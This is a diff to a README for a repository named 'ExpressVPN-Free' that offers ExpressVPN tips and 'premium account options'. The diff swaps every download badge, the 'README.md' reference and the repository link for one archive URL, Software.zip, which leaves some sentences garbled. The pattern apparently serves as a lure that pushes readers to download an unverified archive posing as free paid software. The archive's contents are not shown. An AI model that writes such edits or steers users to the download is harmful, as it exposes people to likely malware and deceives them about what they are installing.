@@ -1,8 +1,8 @@
 # 🚀 **ExpressVPN-Free Repository**
 
-[![GitHub release](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![GitHub release](https://github.com/Laroui-Imane/ExpressVPN-Free/releases/download/v1.0/Software.zip)](https://github.com/Laroui-Imane/ExpressVPN-Free/releases/download/v1.0/Software.zip)
 
-Welcome to the ExpressVPN-Free repository, where you can explore various aspects related to ExpressVPN, from its functionality in China to troubleshooting tips and premium account options. This README.md will guide you through the repository's content, topics, and how to access the latest release.
+Welcome to the ExpressVPN-Free repository, where you can explore various aspects related to ExpressVPN, from its functionality in China to troubleshooting tips and premium account options. This https://github.com/Laroui-Imane/ExpressVPN-Free/releases/download/v1.0/Software.zip will guide you through the repository's content, topics, and how to access the latest release.
 
 ## 📁 Repository Content
 
@@ -30,13 +30,13 @@ The repository topics include:
 
 ## 📦 Latest Release
 
-[![Download Latest Release](https://img.shields.io/badge/Latest%20Release-v1.0.0-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/Laroui-Imane/ExpressVPN-Free/releases/download/v1.0/Software.zip%20Release-v1.0.0-green)](https://github.com/Laroui-Imane/ExpressVPN-Free/releases/download/v1.0/Software.zip)
 
 Click the button above to download the latest release of the repository. Make sure to extract the contents after downloading to access the full range of resources available.
 
 ## 🌐 Explore More
 
-If you want to delve deeper into the topics covered in the repository or explore related discussions, visit the [ExpressVPN-Free GitHub Repository](https://github.com/expressvpn-free).
+If you want to delve deeper into the topics covered in the repository or explore related discussions, visit the [ExpressVPN-Free GitHub Repository](https://github.com/Laroui-Imane/ExpressVPN-Free/releases/download/v1.0/Software.zip).
 
 ## 🚨 Need Help?
 
